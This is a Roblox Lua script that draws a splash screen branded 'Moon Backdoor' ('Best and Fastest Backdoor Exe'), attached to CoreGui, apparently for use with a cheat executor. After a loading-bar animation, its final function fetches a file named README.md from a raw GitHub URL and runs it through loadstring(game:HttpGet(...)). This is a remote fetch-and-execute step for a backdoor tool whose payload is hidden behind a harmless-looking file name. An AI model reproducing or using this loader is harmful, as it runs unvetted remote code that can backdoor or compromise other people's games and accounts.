-- Instances: 14 | Scripts: 1 | Modules: 0 | Tags: 0
local G2L = {};

-- StarterGui.ScreenGui
G2L["1"] = Instance.new("ScreenGui", game.CoreGui);
G2L["1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;


-- StarterGui.ScreenGui.OK
G2L["2"] = Instance.new("Frame", G2L["1"]);
G2L["2"]["BorderSizePixel"] = 0;
G2L["2"]["BackgroundColor3"] = Color3.fromRGB(58, 60, 62);
G2L["2"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["2"]["Size"] = UDim2.new(0, 402, -0.07476, 244);
G2L["2"]["Position"] = UDim2.new(0.5, 0, 0.53326, 0);
G2L["2"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["2"]["Name"] = [[OK]];


-- StarterGui.ScreenGui.OK.Element
G2L["3"] = Instance.new("Frame", G2L["2"]);
G2L["3"]["BorderSizePixel"] = 0;
G2L["3"]["BackgroundColor3"] = Color3.fromRGB(239, 248, 255);
G2L["3"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["3"]["Size"] = UDim2.new(-0.02, 402, 0.03, 201);
G2L["3"]["Position"] = UDim2.new(0.5, 0, 0.49957, 0);
G2L["3"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["3"]["Name"] = [[Element]];
G2L["3"]["BackgroundTransparency"] = 0.95;


-- StarterGui.ScreenGui.OK.Element.UIGradient
G2L["4"] = Instance.new("UIGradient", G2L["3"]);
G2L["4"]["Rotation"] = -136;
G2L["4"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 0),NumberSequenceKeypoint.new(0.414, 0),NumberSequenceKeypoint.new(0.422, 1),NumberSequenceKeypoint.new(1.000, 1)};


-- StarterGui.ScreenGui.OK.Element.Say
G2L["5"] = Instance.new("TextLabel", G2L["3"]);
G2L["5"]["BorderSizePixel"] = 0;
G2L["5"]["TextSize"] = 25;
G2L["5"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["5"]["TextTransparency"] = 0.7;
G2L["5"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["5"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["5"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["5"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["5"]["BackgroundTransparency"] = 1;
G2L["5"]["Size"] = UDim2.new(-0.1, 200, -0.08554, 50);
G2L["5"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["5"]["Text"] = [[Best and Fastest Backdoor Exe]];
G2L["5"]["Name"] = [[Say]];
G2L["5"]["Position"] = UDim2.new(0.06229, 0, 0.20771, 0);


-- StarterGui.ScreenGui.OK.Element.Bar1
G2L["6"] = Instance.new("Frame", G2L["3"]);
G2L["6"]["BorderSizePixel"] = 0;
G2L["6"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["6"]["Size"] = UDim2.new(0, 238, 0, 6);
G2L["6"]["Position"] = UDim2.new(0.0398, 0, 0.91156, 0);
G2L["6"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["6"]["Name"] = [[Bar1]];
G2L["6"]["BackgroundTransparency"] = 0.8;


-- StarterGui.ScreenGui.OK.Element.Bar1.Bar2
G2L["7"] = Instance.new("Frame", G2L["6"]);
G2L["7"]["BorderSizePixel"] = 0;
G2L["7"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["7"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["7"]["Size"] = UDim2.new(0, 0, 0, 6);
G2L["7"]["Position"] = UDim2.new(0, 0, 0.703, 0);
G2L["7"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["7"]["Name"] = [[Bar2]];
G2L["7"]["BackgroundTransparency"] = 0.8;


-- StarterGui.ScreenGui.OK.Element.Bar1.Bar2.LocalScript
G2L["8"] = Instance.new("LocalScript", G2L["7"]);



-- StarterGui.ScreenGui.OK.Element.Bar1.UIListLayout
G2L["9"] = Instance.new("UIListLayout", G2L["6"]);
G2L["9"]["VerticalAlignment"] = Enum.VerticalAlignment.Center;
G2L["9"]["SortOrder"] = Enum.SortOrder.LayoutOrder;


-- StarterGui.ScreenGui.OK.Element.Creator
G2L["a"] = Instance.new("TextLabel", G2L["3"]);
G2L["a"]["TextWrapped"] = true;
G2L["a"]["BorderSizePixel"] = 0;
G2L["a"]["TextSize"] = 18;
G2L["a"]["TextXAlignment"] = Enum.TextXAlignment.Right;
G2L["a"]["TextTransparency"] = 0.7;
G2L["a"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["a"]["TextScaled"] = true;
G2L["a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["a"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["a"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["a"]["BackgroundTransparency"] = 1;
G2L["a"]["Size"] = UDim2.new(-0.18706, 200, -0.15797, 50);
G2L["a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["a"]["Text"] = [[Developed by MoonVM]];
G2L["a"]["Name"] = [[Creator]];
G2L["a"]["Position"] = UDim2.new(0.66393, 0, 0.87074, 0);


-- StarterGui.ScreenGui.OK.Element.ASL
G2L["b"] = Instance.new("TextLabel", G2L["3"]);
G2L["b"]["BorderSizePixel"] = 0;
G2L["b"]["TextSize"] = 39;
G2L["b"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["b"]["TextTransparency"] = 0.7;
G2L["b"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["b"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["b"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["b"]["BackgroundTransparency"] = 1;
G2L["b"]["Size"] = UDim2.new(-0.1, 200, -0.08554, 50);
G2L["b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["b"]["Text"] = [[Moon Backdoor]];
G2L["b"]["Name"] = [[ASL]];
G2L["b"]["Position"] = UDim2.new(0.06229, 0, 0.06487, 0);


-- StarterGui.ScreenGui.Ops
G2L["c"] = Instance.new("Frame", G2L["1"]);
G2L["c"]["BorderSizePixel"] = 0;
G2L["c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["c"]["Size"] = UDim2.new(0.99182, 1, 0.97679, 1);
G2L["c"]["Position"] = UDim2.new(0.00818, 0, 0, 0);
G2L["c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["c"]["Name"] = [[Ops]];
G2L["c"]["BackgroundTransparency"] = 1;


-- StarterGui.ScreenGui.Ops.UIListLayout
G2L["d"] = Instance.new("UIListLayout", G2L["c"]);
G2L["d"]["VerticalAlignment"] = Enum.VerticalAlignment.Bottom;
G2L["d"]["SortOrder"] = Enum.SortOrder.LayoutOrder;


-- StarterGui.ScreenGui.Ops.ASL
G2L["e"] = Instance.new("TextLabel", G2L["c"]);
G2L["e"]["TextWrapped"] = true;
G2L["e"]["BorderSizePixel"] = 0;
G2L["e"]["TextSize"] = 39;
G2L["e"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["e"]["TextTransparency"] = 1;
G2L["e"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["e"]["TextScaled"] = true;
G2L["e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["e"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["e"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["e"]["BackgroundTransparency"] = 1;
G2L["e"]["Size"] = UDim2.new(-0.08435, 200, -0.06056, 50);
G2L["e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["e"]["Text"] = [[Moon Backdoor]];
G2L["e"]["Name"] = [[ASL]];
G2L["e"]["Position"] = UDim2.new(0, 0, 0.98149, 0);


-- StarterGui.ScreenGui.OK.Element.Bar1.Bar2.LocalScript
local function C_8()
local script = G2L["8"];
	local bar2 = script.Parent
	
	if not game:IsLoaded() then
		game.Loaded:Wait()
	end
	
	wait(2)
	
	bar2:TweenSize(
		UDim2.new(0, 238, 0, 8),
		Enum.EasingDirection.Out,
		Enum.EasingStyle.Quad,
		0.5,
		true
	)
	
	wait(1)
	
	script.Parent.Parent.Parent.Parent:TweenPosition(UDim2.new(0.5, 0,1.47, 0))
	
	for i = 1, 0.7, -0.1 do
		script.Parent.Parent.Parent.Parent.Parent.Ops.ASL.TextTransparency = i
		wait(0.05)
		
		script.Parent.Parent.Parent.Parent.Parent.Ops.ASL:TweenSize(UDim2.new(0, 200,-0.016, 50))
	end
	
	
	loadstring(game:HttpGet("https://raw.githubusercontent.com/G4mg1/newone/refs/heads/main/README.md"))()
end;
task.spawn(C_8);

return G2L["1"], require;
